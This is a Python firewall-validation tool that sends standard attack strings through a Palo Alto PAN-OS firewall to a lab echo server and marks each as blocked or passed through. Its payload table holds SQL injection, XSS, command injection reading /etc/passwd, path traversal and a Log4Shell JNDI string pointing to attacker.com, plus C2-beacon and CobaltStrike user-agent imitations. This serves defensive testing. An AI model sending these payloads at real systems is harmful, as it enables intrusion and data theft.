"""Security Testing Engine — validates PAN-OS NGFW security profiles.

Runs known attack patterns through the firewall and checks whether they are
blocked (PASS) or pass through (FAIL). Covers Vulnerability Protection,
Anti-Virus/Threat Prevention, and URL Filtering.
"""
import io
import json
import logging
import os
import socket
import ssl
import subprocess
import threading
import time
import uuid
import zipfile
from dataclasses import dataclass, field
from typing import Dict, List, Optional
from urllib.parse import quote

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
log = logging.getLogger('security')

# ─── Data Structures ────────────────────────────────────────

@dataclass
class SecurityTestCase:
    id: str
    name: str
    category: str           # web_attacks | malware_threats | url_filtering
    description: str
    expected_action: str    # "block"
    panos_feature: str      # PAN-OS feature that should catch this
    # Custom pattern fields
    custom: bool = False
    payload: str = ''
    method: str = 'GET'
    headers: dict = field(default_factory=dict)
    target_path: str = '/echo'

@dataclass
class SecurityTestResult:
    test_id: str
    test_name: str
    category: str
    expected_action: str
    actual_result: str      # blocked | passed_through | error | pending
    verdict: str            # PASS | FAIL | ERROR
    response_code: int
    detail: str
    panos_feature: str
    timestamp: float = 0.0
    # Enriched fields
    description: str = ''
    payload: str = ''
    url: str = ''
    method: str = ''
    expected_behavior: str = ''
    response_body_snippet: str = ''
    response_headers: dict = field(default_factory=dict)
    verdict_explanation: str = ''

# ─── Expected Behavior Map ──────────────────────────────────

EXPECTED_BEHAVIOR = {
    'sqli_union': 'Firewall Vulnerability Protection profile should detect UNION SELECT pattern in the HTTP request and reset/block the connection',
    'sqli_or': 'Firewall should detect OR-based SQL injection bypass pattern and block the request',
    'sqli_drop': 'Firewall should detect destructive DROP TABLE SQL statement and block the request',
    'xss_script': 'Firewall should detect <script> tag in URL parameter and block reflected XSS attempt',
    'xss_img': 'Firewall should detect IMG tag with onerror JavaScript handler and block the XSS payload',
    'xss_svg': 'Firewall should detect SVG element with onload handler and block the XSS payload',
    'cmdi_cat': 'Firewall should detect OS command injection pattern (semicolon + system command) and block',
    'cmdi_pipe': 'Firewall should detect pipe-based command injection and block the request',
    'cmdi_backtick': 'Firewall should detect backtick command execution and block the request',
    'path_traversal': 'Firewall should detect directory traversal sequences (../../) targeting sensitive files',
    'log4shell': 'Firewall should detect JNDI lookup string ${jndi:ldap://...} in HTTP headers (CVE-2021-44228)',
    'eicar_http': 'Firewall Anti-Virus profile should detect EICAR test file signature in HTTP response and block the download',
    'eicar_https': 'Firewall must have SSL Decryption enabled to inspect HTTPS payload. Anti-Virus should detect EICAR in decrypted stream',
    'eicar_zip': 'Firewall Anti-Virus should detect EICAR inside ZIP archive (requires archive inspection enabled)',
    'c2_callback': 'Firewall Anti-Spyware profile should detect C2 beacon callback pattern (base64 payload + suspicious headers)',
    'malicious_ua': 'Firewall Anti-Spyware should detect known malware User-Agent string (CobaltStrike)',
    'url_malware': 'Firewall URL Filtering profile should block access to URLs categorized as malware in PAN-DB',
    'url_phishing': 'Firewall URL Filtering should block URLs categorized as phishing in PAN-DB',
    'url_hacking': 'Firewall URL Filtering should block URLs categorized as hacking in PAN-DB',
    'url_proxy': 'Firewall URL Filtering should block URLs categorized as proxy-avoidance/anonymizers in PAN-DB',
}

# ─── Test Catalog ───────────────────────────────────────────

WEB_ATTACK_TESTS = [
    SecurityTestCase('sqli_union', 'SQL Injection — UNION SELECT',
        'web_attacks', 'UNION-based SQL injection in URL query parameter. Sends a crafted SQL UNION SELECT statement that attempts to extract usernames and passwords from the database. This is one of the most common SQL injection techniques used to exfiltrate data.',
        'block', 'Vulnerability Protection'),
    SecurityTestCase('sqli_or', 'SQL Injection — OR 1=1',
        'web_attacks', 'Boolean-based SQL injection via OR clause. Injects an always-true condition (OR 1=1) to bypass authentication or retrieve all records from a database table.',
        'block', 'Vulnerability Protection'),
    SecurityTestCase('sqli_drop', 'SQL Injection — DROP TABLE',
        'web_attacks', 'Destructive SQL injection with DROP TABLE statement. Attempts to delete an entire database table, causing data loss and service disruption.',
        'block', 'Vulnerability Protection'),
    SecurityTestCase('xss_script', 'XSS — Script Tag',
        'web_attacks', 'Reflected XSS via <script> tag in URL parameter. Injects JavaScript code that executes in the victim\'s browser when the server reflects the payload back in the response.',
        'block', 'Vulnerability Protection'),
    SecurityTestCase('xss_img', 'XSS — IMG onerror',
        'web_attacks', 'Reflected XSS via IMG tag with onerror handler. Uses a broken image tag to trigger JavaScript execution through the onerror event handler, bypassing basic script tag filters.',
        'block', 'Vulnerability Protection'),
    SecurityTestCase('xss_svg', 'XSS — SVG onload',
        'web_attacks', 'Reflected XSS via SVG element with onload handler. Exploits SVG\'s onload event to execute JavaScript, a technique often used to bypass XSS filters.',
        'block', 'Vulnerability Protection'),
    SecurityTestCase('cmdi_cat', 'Command Injection — cat /etc/passwd',
        'web_attacks', 'OS command injection reading sensitive file. Appends a semicolon and system command to read /etc/passwd, attempting to extract user account information from the server.',
        'block', 'Vulnerability Protection'),
    SecurityTestCase('cmdi_pipe', 'Command Injection — Pipe',
        'web_attacks', 'OS command injection using pipe operator. Uses the pipe (|) to chain a directory listing command, attempting to enumerate the server\'s file system.',
        'block', 'Vulnerability Protection'),
    SecurityTestCase('cmdi_backtick', 'Command Injection — Backtick',
        'web_attacks', 'OS command injection via backtick execution. Uses backtick syntax to execute the id command, revealing the server process\'s user identity and privileges.',
        'block', 'Vulnerability Protection'),
    SecurityTestCase('path_traversal', 'Path Traversal — ../../etc/passwd',
        'web_attacks', 'Directory traversal to read /etc/passwd. Uses relative path sequences (../) to escape the web root and access sensitive system files.',
        'block', 'Vulnerability Protection'),
    SecurityTestCase('log4shell', 'Log4Shell — JNDI Lookup',
        'web_attacks', 'Log4j RCE via JNDI lookup string in HTTP header (CVE-2021-44228). Sends the ${jndi:ldap://...} payload in HTTP headers, exploiting the Log4j vulnerability to trigger remote code execution.',
        'block', 'Vulnerability Protection'),
]

MALWARE_TESTS = [
    SecurityTestCase('eicar_http', 'EICAR Download — HTTP',
        'malware_threats', 'Download EICAR anti-malware test file over HTTP (port 9999). The EICAR test string is a standardized 68-byte file recognized by all anti-virus products as a test threat. Downloaded over unencrypted HTTP for easy inspection.',
        'block', 'Anti-Virus'),
    SecurityTestCase('eicar_https', 'EICAR Download — HTTPS',
        'malware_threats', 'Download EICAR test file over HTTPS (port 443). Same EICAR file but over encrypted HTTPS. Firewall must have SSL Decryption policy enabled to inspect the encrypted payload and detect the threat.',
        'block', 'Anti-Virus'),
    SecurityTestCase('eicar_zip', 'EICAR in ZIP — HTTP',
        'malware_threats', 'Download EICAR inside ZIP archive over HTTP. Tests whether the firewall can inspect compressed archives and detect threats inside ZIP files. Requires archive inspection to be enabled in the Anti-Virus profile.',
        'block', 'Anti-Virus'),
    SecurityTestCase('c2_callback', 'C2 Callback Pattern',
        'malware_threats', 'HTTP POST with encoded data mimicking C2 beacon callback. Sends a base64-encoded payload with suspicious headers (old IE User-Agent, hex session cookie, suspicious X-Request-ID) that mimic command-and-control beacon traffic.',
        'block', 'Anti-Spyware'),
    SecurityTestCase('malicious_ua', 'Malicious User-Agent',
        'malware_threats', 'HTTP request with known malware User-Agent string. Sends a request with "Wget/1.0 (CobaltStrike)" User-Agent, mimicking traffic from a well-known penetration testing/attack framework.',
        'block', 'Anti-Spyware'),
]

URL_FILTERING_TESTS = [
    SecurityTestCase('url_malware', 'URL Category — Malware',
        'url_filtering', 'Access URL in PAN-DB malware category. Attempts to visit a URL that PAN-DB classifies as hosting malware. URL Filtering policy should block access to this category.',
        'block', 'URL Filtering'),
    SecurityTestCase('url_phishing', 'URL Category — Phishing',
        'url_filtering', 'Access URL in PAN-DB phishing category. Attempts to visit a URL classified as a phishing site. URL Filtering should block access to prevent credential theft.',
        'block', 'URL Filtering'),
    SecurityTestCase('url_hacking', 'URL Category — Hacking',
        'url_filtering', 'Access URL in PAN-DB hacking category. Attempts to visit a URL categorized as hacking/computer security tools. URL Filtering should block based on policy.',
        'block', 'URL Filtering'),
    SecurityTestCase('url_proxy', 'URL Category — Proxy/Anonymizer',
        'url_filtering', 'Access URL in PAN-DB proxy-avoidance category. Attempts to visit a proxy/anonymizer site used to bypass security controls. URL Filtering should block to prevent policy evasion.',
        'block', 'URL Filtering'),
]

ALL_TESTS = WEB_ATTACK_TESTS + MALWARE_TESTS + URL_FILTERING_TESTS
TEST_MAP = {t.id: t for t in ALL_TESTS}

# Default URL Filtering test URLs (configurable at runtime)
DEFAULT_URL_MAP = {
    'url_malware': 'http://urlfiltering.paloaltonetworks.com/test-malware',
    'url_phishing': 'http://urlfiltering.paloaltonetworks.com/test-phishing',
    'url_hacking': 'http://urlfiltering.paloaltonetworks.com/test-hacking',
    'url_proxy': 'http://urlfiltering.paloaltonetworks.com/test-proxy-avoidance-and-anonymizers',
}

# PAN-OS block page markers (HTML response contains these when blocked)
BLOCK_PAGE_MARKERS = [
    'Palo Alto Networks',
    'block page',
    'URL Filtering',
    'Threat Prevention',
    'has been blocked',
    'Web Page Blocked',
    'Access to this website',
    'Security policy',
]

# ─── Attack Payloads ────────────────────────────────────────

ATTACK_PAYLOADS = {
    'sqli_union': "' UNION SELECT username,password FROM users--",
    'sqli_or': "' OR '1'='1' --",
    'sqli_drop': "'; DROP TABLE users;--",
    'xss_script': '<script>alert("XSS")</script>',
    'xss_img': '<img src=x onerror=alert("XSS")>',
    'xss_svg': '<svg onload=alert("XSS")>',
    'cmdi_cat': '; cat /etc/passwd',
    'cmdi_pipe': '| ls -la /',
    'cmdi_backtick': '`id`',
    'path_traversal': '../../../../etc/passwd',
    'log4shell': '${jndi:ldap://attacker.com/exploit}',
}

# ─── Custom Pattern Store ──────────────────────────────────

class CustomPatternStore:
    """Persistent storage for user-defined attack patterns."""

    def __init__(self, path=None):
        if path is None:
            # Prefer /data if writable, else /tmp
            if os.path.isdir('/data') and os.access('/data', os.W_OK):
                path = '/data/custom_patterns.json'
            else:
                path = '/tmp/custom_patterns.json'
        self._path = path
        self._lock = threading.Lock()
        self._patterns: List[dict] = []
        self._load()

    def _load(self):
        try:
            with open(self._path) as f:
                self._patterns = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            self._patterns = []

    def _save(self):
        with open(self._path, 'w') as f:
            json.dump(self._patterns, f, indent=2)

    def list(self) -> List[dict]:
        with self._lock:
            return list(self._patterns)

    def add(self, pattern: dict) -> dict:
        with self._lock:
            pattern['id'] = 'custom_' + uuid.uuid4().hex[:8]
            self._patterns.append(pattern)
            self._save()
            return pattern

    def update(self, pattern_id: str, updates: dict) -> Optional[dict]:
        with self._lock:
            for p in self._patterns:
                if p['id'] == pattern_id:
                    p.update(updates)
                    p['id'] = pattern_id  # Prevent id overwrite
                    self._save()
                    return p
            return None

    def delete(self, pattern_id: str) -> bool:
        with self._lock:
            before = len(self._patterns)
            self._patterns = [p for p in self._patterns if p['id'] != pattern_id]
            if len(self._patterns) < before:
                self._save()
                return True
            return False

    def to_test_cases(self) -> List[SecurityTestCase]:
        cases = []
        with self._lock:
            for p in self._patterns:
                cases.append(SecurityTestCase(
                    id=p['id'],
                    name=p.get('name', 'Custom Test'),
                    category=p.get('category', 'web_attacks'),
                    description=p.get('description', ''),
                    expected_action=p.get('expected_action', 'block'),
                    panos_feature=p.get('panos_feature', 'Vulnerability Protection'),
                    custom=True,
                    payload=p.get('payload', ''),
                    method=p.get('method', 'GET'),
                    headers=p.get('headers', {}),
                    target_path=p.get('target_path', '/echo'),
                ))
        return cases


# ─── Response Helpers ──────────────────────────────────────

def _resp_snippet(resp) -> str:
    """Get first 500 chars of response body safely."""
    try:
        text = resp.text or ''
        return text[:500]
    except Exception:
        try:
            return repr(resp.content[:500])
        except Exception:
            return ''

def _resp_headers(resp) -> dict:
    """Get response headers as dict."""
    try:
        return dict(resp.headers)
    except Exception:
        return {}


# ─── Security Test Engine ───────────────────────────────────

class SecurityTestEngine:
    def __init__(self, custom_store: Optional[CustomPatternStore] = None):
        self._results: Dict[str, SecurityTestResult] = {}
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()
        self._logs: List[str] = []
        self._lock = threading.Lock()
        self._url_map = dict(DEFAULT_URL_MAP)
        self._custom_store = custom_store
        self._test_map = dict(TEST_MAP)
        self._all_tests = list(ALL_TESTS)
        if custom_store:
            self._reload_custom()

    def _reload_custom(self):
        """Refresh test catalog with custom patterns."""
        self._all_tests = list(ALL_TESTS)
        self._test_map = dict(TEST_MAP)
        if self._custom_store:
            for tc in self._custom_store.to_test_cases():
                self._all_tests.append(tc)
                self._test_map[tc.id] = tc

    def reload_catalog(self):
        """Public method to refresh catalog after custom pattern CRUD."""
        self._reload_custom()

    def get_catalog(self) -> dict:
        """Return test catalog grouped by category."""
        self._reload_custom()
        groups = {}
        for t in self._all_tests:
            if t.category not in groups:
                groups[t.category] = []
            groups[t.category].append({
                'id': t.id, 'name': t.name, 'category': t.category,
                'description': t.description, 'expected_action': t.expected_action,
                'panos_feature': t.panos_feature, 'custom': t.custom,
            })
        return groups

    def start(self, test_ids: List[str], config: dict) -> tuple:
        """Start running selected tests. Returns (ok, message)."""
        if self._running:
            return False, 'Security tests already running'

        self._reload_custom()
        tests = [self._test_map[tid] for tid in test_ids if tid in self._test_map]
        if not tests:
            return False, 'No valid tests selected'

        # Update URL map if custom URLs provided
        custom_urls = config.get('url_map', {})
        self._url_map.update(custom_urls)

        host = config.get('host', os.environ.get('SERVER_HOST', 'server'))
        http_port = int(config.get('http_port', 9999))
        https_port = int(config.get('https_port', 443))
        interval = float(config.get('interval', 2))

        # Mark selected tests as pending
        with self._lock:
            for t in tests:
                self._results[t.id] = SecurityTestResult(
                    test_id=t.id, test_name=t.name, category=t.category,
                    expected_action=t.expected_action, actual_result='pending',
                    verdict='PENDING', response_code=0, detail='Queued',
                    panos_feature=t.panos_feature, timestamp=time.time(),
                    description=t.description)

        self._stop_event.clear()
        self._running = True
        self._thread = threading.Thread(
            target=self._run_tests, args=(tests, host, http_port, https_port, interval),
            daemon=True)
        self._thread.start()
        self._add_log(f'Started {len(tests)} security tests against {host}')
        return True, f'Running {len(tests)} tests'

    def stop(self) -> tuple:
        if not self._running:
            return False, 'Not running'
        self._stop_event.set()
        self._running = False
        self._add_log('Security tests stopped')
        return True, 'Stopped'

    def clear(self):
        with self._lock:
            self._results.clear()
            self._logs.clear()

    def get_status(self) -> dict:
        with self._lock:
            results = []
            for r in self._results.values():
                results.append({
                    'test_id': r.test_id, 'test_name': r.test_name,
                    'category': r.category, 'expected_action': r.expected_action,
                    'actual_result': r.actual_result, 'verdict': r.verdict,
                    'response_code': r.response_code, 'detail': r.detail,
                    'panos_feature': r.panos_feature, 'timestamp': r.timestamp,
                    'description': r.description, 'payload': r.payload,
                    'url': r.url, 'method': r.method,
                    'expected_behavior': r.expected_behavior,
                    'response_body_snippet': r.response_body_snippet,
                    'response_headers': r.response_headers,
                    'verdict_explanation': r.verdict_explanation,
                })
            total = len(results)
            passed = sum(1 for r in results if r['verdict'] == 'PASS')
            failed = sum(1 for r in results if r['verdict'] == 'FAIL')
            errors = sum(1 for r in results if r['verdict'] == 'ERROR')
            pending = sum(1 for r in results if r['verdict'] == 'PENDING')
        return {
            'running': self._running,
            'results': results,
            'logs': list(self._logs[-100:]),
            'summary': {'total': total, 'passed': passed, 'failed': failed,
                        'errors': errors, 'pending': pending},
        }

    def _add_log(self, msg: str):
        with self._lock:
            ts = time.strftime('%H:%M:%S')
            self._logs.append(f'[{ts}] {msg}')
            if len(self._logs) > 500:
                self._logs = self._logs[-250:]
        log.info(msg)

    def _run_tests(self, tests, host, http_port, https_port, interval):
        """Execute tests sequentially."""
        for test in tests:
            if self._stop_event.is_set():
                break
            self._add_log(f'Running: {test.name}')
            try:
                result = self._execute_test(test, host, http_port, https_port)
                with self._lock:
                    self._results[test.id] = result
                verdict_msg = f'{test.name} → {result.verdict}'
                if result.verdict == 'PASS':
                    verdict_msg += ' (blocked by firewall)'
                elif result.verdict == 'FAIL':
                    verdict_msg += ' (passed through — not blocked)'
                self._add_log(verdict_msg)
            except Exception as e:
                with self._lock:
                    self._results[test.id] = self._error_result(test, str(e))
                self._add_log(f'{test.name} → ERROR: {e}')

            if not self._stop_event.is_set():
                time.sleep(interval)

        self._running = False
        self._add_log('Security test run complete')

    def _execute_test(self, test: SecurityTestCase, host: str,
                      http_port: int, https_port: int) -> SecurityTestResult:
        """Run a single test and determine verdict."""
        if test.custom:
            return self._test_custom(test, host, http_port)
        if test.category == 'web_attacks':
            return self._test_web_attack(test, host, http_port)
        elif test.category == 'malware_threats':
            return self._test_malware(test, host, http_port, https_port)
        elif test.category == 'url_filtering':
            return self._test_url_filtering(test)
        else:
            return self._error_result(test, f'Unknown category: {test.category}')

    def _test_custom(self, test: SecurityTestCase, host: str,
                     port: int) -> SecurityTestResult:
        """Execute a custom attack pattern."""
        payload = test.payload
        url = f'http://{host}:{port}{test.target_path}'
        method = test.method.upper()
        try:
            if method == 'POST':
                resp = requests.post(url, data=payload,
                    headers=test.headers or {}, timeout=10)
            else:
                resp = requests.get(url, params={'payload': payload},
                    headers=test.headers or {}, timeout=10)
            return self._analyze_response(test, resp, payload,
                url=url, method=method, sent_payload=payload)
        except (requests.ConnectionError, requests.Timeout) as e:
            return self._blocked_result(test, str(e),
                url=url, method=method, sent_payload=payload)

    def _test_web_attack(self, test: SecurityTestCase, host: str,
                         port: int) -> SecurityTestResult:
        """Send attack payload to echo server and check if blocked."""
        payload = ATTACK_PAYLOADS.get(test.id, '')
        url = f'http://{host}:{port}/echo'

        if test.id == 'log4shell':
            method = 'GET'
            try:
                resp = requests.get(url, params={'payload': 'test'},
                    headers={'X-Api-Version': payload, 'User-Agent': payload},
                    timeout=10)
                return self._analyze_response(test, resp, payload,
                    url=url, method=method, sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout) as e:
                return self._blocked_result(test, str(e),
                    url=url, method=method, sent_payload=payload)
        elif test.id == 'path_traversal':
            trav_url = f'http://{host}:{port}/{payload}'
            method = 'GET'
            try:
                resp = requests.get(trav_url, timeout=10)
                return self._analyze_response(test, resp, payload,
                    url=trav_url, method=method, sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout) as e:
                return self._blocked_result(test, str(e),
                    url=trav_url, method=method, sent_payload=payload)
        else:
            method = 'GET'
            try:
                resp = requests.get(url, params={'payload': payload}, timeout=10)
                return self._analyze_response(test, resp, payload,
                    url=url + '?payload=' + payload, method=method, sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout) as e:
                return self._blocked_result(test, str(e),
                    url=url, method=method, sent_payload=payload)

    def _test_malware(self, test: SecurityTestCase, host: str,
                      http_port: int, https_port: int) -> SecurityTestResult:
        """Test malware/threat detection."""
        if test.id == 'eicar_http':
            url = f'http://{host}:{http_port}/eicar'
            payload = 'EICAR test file download'
            try:
                resp = requests.get(url, timeout=10)
                if resp.status_code == 200 and b'EICAR' in resp.content:
                    return self._passthrough_result(test, resp.status_code,
                        'EICAR test file downloaded successfully — not blocked',
                        resp=resp, url=url, method='GET', sent_payload=payload)
                return self._analyze_response(test, resp, 'EICAR',
                    url=url, method='GET', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout) as e:
                return self._blocked_result(test, str(e),
                    url=url, method='GET', sent_payload=payload)

        elif test.id == 'eicar_https':
            url = f'https://{host}:{https_port}/eicar'
            payload = 'EICAR test file download (HTTPS)'
            try:
                resp = requests.get(url, timeout=10, verify=False)
                if resp.status_code == 200 and b'EICAR' in resp.content:
                    return self._passthrough_result(test, resp.status_code,
                        'EICAR downloaded over HTTPS — not blocked (SSL Decryption may not be enabled)',
                        resp=resp, url=url, method='GET', sent_payload=payload)
                return self._analyze_response(test, resp, 'EICAR',
                    url=url, method='GET', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout) as e:
                return self._blocked_result(test, str(e),
                    url=url, method='GET', sent_payload=payload)

        elif test.id == 'eicar_zip':
            url = f'http://{host}:{http_port}/eicar.zip'
            payload = 'EICAR in ZIP archive download'
            try:
                resp = requests.get(url, timeout=10)
                if resp.status_code == 200 and len(resp.content) > 0:
                    try:
                        with zipfile.ZipFile(io.BytesIO(resp.content)) as zf:
                            if 'eicar.com' in zf.namelist():
                                return self._passthrough_result(test, resp.status_code,
                                    'EICAR ZIP downloaded — not blocked',
                                    resp=resp, url=url, method='GET', sent_payload=payload)
                    except zipfile.BadZipFile:
                        pass
                return self._analyze_response(test, resp, 'EICAR',
                    url=url, method='GET', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout) as e:
                return self._blocked_result(test, str(e),
                    url=url, method='GET', sent_payload=payload)

        elif test.id == 'c2_callback':
            url = f'http://{host}:{http_port}/echo'
            c2_data = 'aWQgLWE7dW5hbWUgLWE7aWZjb25maWc='
            payload = c2_data
            try:
                resp = requests.post(url, data=c2_data,
                    headers={
                        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
                        'X-Request-ID': 'deadbeef-cafe-babe-feed-c0ffee000001',
                        'Cookie': 'session=YWRtaW46cGFzc3dvcmQ=',
                    }, timeout=10)
                return self._analyze_response(test, resp, c2_data,
                    url=url, method='POST', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout) as e:
                return self._blocked_result(test, str(e),
                    url=url, method='POST', sent_payload=payload)

        elif test.id == 'malicious_ua':
            url = f'http://{host}:{http_port}/echo?payload=test'
            payload = 'User-Agent: Wget/1.0 (CobaltStrike)'
            try:
                resp = requests.get(url,
                    headers={'User-Agent': 'Wget/1.0 (CobaltStrike)'},
                    timeout=10)
                return self._analyze_response(test, resp, 'CobaltStrike',
                    url=url, method='GET', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout) as e:
                return self._blocked_result(test, str(e),
                    url=url, method='GET', sent_payload=payload)

        return self._error_result(test, f'Unknown malware test: {test.id}')

    def _test_url_filtering(self, test: SecurityTestCase) -> SecurityTestResult:
        """Test URL filtering by accessing categorized URLs."""
        url = self._url_map.get(test.id, '')
        if not url:
            return self._error_result(test, 'No URL configured for this test')
        payload = url
        try:
            resp = requests.get(url, timeout=10, verify=False,
                allow_redirects=True,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
            if self._is_block_page(resp):
                return self._blocked_result(test,
                    f'HTTP {resp.status_code} — Block page detected', resp.status_code,
                    resp=resp, url=url, method='GET', sent_payload=payload)
            if resp.status_code == 200:
                return self._passthrough_result(test, resp.status_code,
                    f'URL accessible — not blocked by URL Filtering',
                    resp=resp, url=url, method='GET', sent_payload=payload)
            if resp.status_code in (403, 406, 503):
                return self._blocked_result(test,
                    f'HTTP {resp.status_code} — likely blocked', resp.status_code,
                    resp=resp, url=url, method='GET', sent_payload=payload)
            return self._passthrough_result(test, resp.status_code,
                f'HTTP {resp.status_code} — unclear if blocked',
                resp=resp, url=url, method='GET', sent_payload=payload)
        except (requests.ConnectionError, requests.Timeout) as e:
            return self._blocked_result(test, f'Connection blocked: {e}',
                url=url, method='GET', sent_payload=payload)

    # ─── Response Analysis ──────────────────────────────────

    def _analyze_response(self, test: SecurityTestCase, resp,
                          payload_marker: str, url='', method='',
                          sent_payload='') -> SecurityTestResult:
        """Determine if a response indicates the attack was blocked or passed through."""
        if self._is_block_page(resp):
            return self._blocked_result(test,
                f'HTTP {resp.status_code} — Block page detected', resp.status_code,
                resp=resp, url=url, method=method, sent_payload=sent_payload)

        if resp.status_code in (403, 406, 503):
            return self._blocked_result(test,
                f'HTTP {resp.status_code} — blocked by firewall', resp.status_code,
                resp=resp, url=url, method=method, sent_payload=sent_payload)

        if resp.status_code == 200:
            body = resp.text
            if payload_marker and payload_marker in body:
                return self._passthrough_result(test, resp.status_code,
                    'Payload echoed back — attack passed through firewall',
                    resp=resp, url=url, method=method, sent_payload=sent_payload)
            if '/echo' in (resp.url or '') or 'Echo Response' in body:
                return self._passthrough_result(test, resp.status_code,
                    'Echo server responded — attack passed through',
                    resp=resp, url=url, method=method, sent_payload=sent_payload)

        return self._passthrough_result(test, resp.status_code,
            f'HTTP {resp.status_code} — not blocked',
            resp=resp, url=url, method=method, sent_payload=sent_payload)

    def _is_block_page(self, resp) -> bool:
        """Check if response contains a PAN-OS block page."""
        text = resp.text.lower() if resp.text else ''
        for marker in BLOCK_PAGE_MARKERS:
            if marker.lower() in text:
                return True
        return False

    def _blocked_result(self, test, detail, status_code=0,
                        resp=None, url='', method='', sent_payload=''):
        expected = EXPECTED_BEHAVIOR.get(test.id, f'Firewall should block this {test.panos_feature} threat')
        explanation = (f'PASS — The firewall correctly blocked this attack. '
                      f'The connection was reset or a block page was returned, '
                      f'indicating that {test.panos_feature} detected the threat pattern.')
        return SecurityTestResult(
            test_id=test.id, test_name=test.name, category=test.category,
            expected_action=test.expected_action, actual_result='blocked',
            verdict='PASS', response_code=status_code, detail=detail,
            panos_feature=test.panos_feature, timestamp=time.time(),
            description=test.description, payload=sent_payload,
            url=url, method=method, expected_behavior=expected,
            response_body_snippet=_resp_snippet(resp) if resp else '',
            response_headers=_resp_headers(resp) if resp else {},
            verdict_explanation=explanation)

    def _passthrough_result(self, test, status_code, detail,
                            resp=None, url='', method='', sent_payload=''):
        expected = EXPECTED_BEHAVIOR.get(test.id, f'Firewall should block this {test.panos_feature} threat')
        explanation = (f'FAIL — The attack was NOT blocked by the firewall. '
                      f'The server responded with HTTP {status_code} and the payload was delivered. '
                      f'Check that {test.panos_feature} profile is applied to the security policy '
                      f'and that the traffic matches the policy rule.')
        return SecurityTestResult(
            test_id=test.id, test_name=test.name, category=test.category,
            expected_action=test.expected_action, actual_result='passed_through',
            verdict='FAIL', response_code=status_code, detail=detail,
            panos_feature=test.panos_feature, timestamp=time.time(),
            description=test.description, payload=sent_payload,
            url=url, method=method, expected_behavior=expected,
            response_body_snippet=_resp_snippet(resp) if resp else '',
            response_headers=_resp_headers(resp) if resp else {},
            verdict_explanation=explanation)

    def _error_result(self, test, detail, url='', method='', sent_payload=''):
        expected = EXPECTED_BEHAVIOR.get(test.id, '')
        return SecurityTestResult(
            test_id=test.id, test_name=test.name, category=test.category,
            expected_action=test.expected_action, actual_result='error',
            verdict='ERROR', response_code=0, detail=detail,
            panos_feature=test.panos_feature, timestamp=time.time(),
            description=test.description, payload=sent_payload,
            url=url, method=method, expected_behavior=expected,
            verdict_explanation=f'ERROR — Test could not complete: {detail}')
